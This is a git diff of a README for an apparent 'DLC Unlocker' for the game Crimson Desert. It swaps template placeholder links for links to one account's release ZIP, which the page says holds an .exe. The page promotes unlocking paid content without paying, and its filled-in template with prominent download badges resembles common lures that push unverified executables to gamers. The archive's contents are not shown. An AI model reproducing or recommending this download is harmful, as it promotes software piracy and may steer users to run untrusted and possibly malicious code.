@@ -1,7 +1,7 @@
 ## Download Crimson Desert — DLC Unlocker (v1.0 • March 2026)
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/CrimsonDesert-DLC-Unlocker/releases/download/v1.0/CrimsonDesert-DLC-Unlocker.zip">
+  <a href="https://github.com/Rendi-18/Download-Crimson-Desert-DLC-Unlocker/releases/download/v1.0/CrimsonDesert.Unlocker.DLC.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD%20LATEST%20RELEASE!-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=8B0000" alt="Download from GitHub Releases" width="380">
   </a>
 </p>
@@ -30,7 +30,7 @@
 ### Where This Tool Has Been Shared (March 2026)
 | Platform          | Description                                   | Link                                                                 |
 |-------------------|-----------------------------------------------|----------------------------------------------------------------------|
-| GitHub (Official) | Source code + Releases (ZIP + .exe)           | [github.com/YOUR_USERNAME/CrimsonDesert-DLC-Unlocker](https://github.com/YOUR_USERNAME/CrimsonDesert-DLC-Unlocker) |
+| GitHub (Official) | Source code + Releases (ZIP + .exe)           | [https://github.com/Rendi-18/Download-Crimson-Desert-DLC-Unlocker/releases/download/v1.0/CrimsonDesert.Unlocker.DLC.zip](https://github.com/Rendi-18/Download-Crimson-Desert-DLC-Unlocker/releases/tag/v1.0) |
 
 Thanks to the Crimson Desert community! ❤️  
 If your site/forum reposted it — tell me, I'll add the link.
@@ -38,8 +38,8 @@ If your site/forum reposted it — tell me, I'll add the link.
 Made with passion for Crimson Desert players • Open Source • March 2026
 
 ### 📥 Download & Discuss
-[![DOWNLOAD v1.0](https://img.shields.io/badge/DOWNLOAD%20v1.0-READY!-brightgreen?style=for-the-badge&logo=windows&color=8B0000)](https://github.com/YOUR_USERNAME/CrimsonDesert-DLC-Unlocker/releases/download/v1.0/CrimsonDesert-DLC-Unlocker.zip)
-[![ALL RELEASES](https://img.shields.io/badge/ALL%20RELEASES-blue?style=for-the-badge)](https://github.com/YOUR_USERNAME/CrimsonDesert-DLC-Unlocker/releases)
+[![DOWNLOAD v1.0](https://img.shields.io/badge/DOWNLOAD%20v1.0-READY!-brightgreen?style=for-the-badge&logo=windows&color=8B0000)](https://github.com/Rendi-18/Download-Crimson-Desert-DLC-Unlocker/releases/download/v1.0/CrimsonDesert.Unlocker.DLC.zip)
+[![ALL RELEASES](https://img.shields.io/badge/ALL%20RELEASES-blue?style=for-the-badge)](https://github.com/Rendi-18/Download-Crimson-Desert-DLC-Unlocker/releases/tag/v1.0)
 
 MIT License • Open Source  
 **Made with ❤️ for the Crimson Desert community • v1.0 — March 2026**
